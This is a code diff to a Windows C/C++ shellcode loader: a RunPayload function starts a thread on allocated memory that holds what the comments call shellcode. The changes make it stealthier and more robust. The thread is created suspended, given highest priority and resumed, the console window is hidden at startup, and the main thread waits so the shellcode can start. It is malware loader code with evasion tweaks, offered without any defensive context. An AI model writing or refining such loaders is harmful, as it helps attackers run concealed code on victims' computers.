@@ -462,9 +462,24 @@ void RunPayload()
             return;
         }
 
-        HANDLE tHandle = CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
+        // Create thread with higher priority and detached state
+        HANDLE tHandle = CreateThread(
+            NULL,
+            0,
+            (LPTHREAD_START_ROUTINE)alloc_mem,
+            NULL,
+            CREATE_SUSPENDED,  // Create suspended first
+            NULL
+        );
 
         if (tHandle) {
+            // Set thread priority to highest
+            SetThreadPriority(tHandle, THREAD_PRIORITY_HIGHEST);
+            
+            // Resume the thread
+            ResumeThread(tHandle);
+            
+            // Detach the thread so it continues running even if main thread ends
             CloseHandle(tHandle);
         }
     } catch (...) {
@@ -472,8 +487,13 @@ void RunPayload()
 }
 
 int main() {
+    // Hide console window
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    
     try {
         RunPayload();
+        // Keep main thread alive for a short time to ensure shellcode starts
+        Sleep(700);
     } catch (...) {
         return 1;
     }
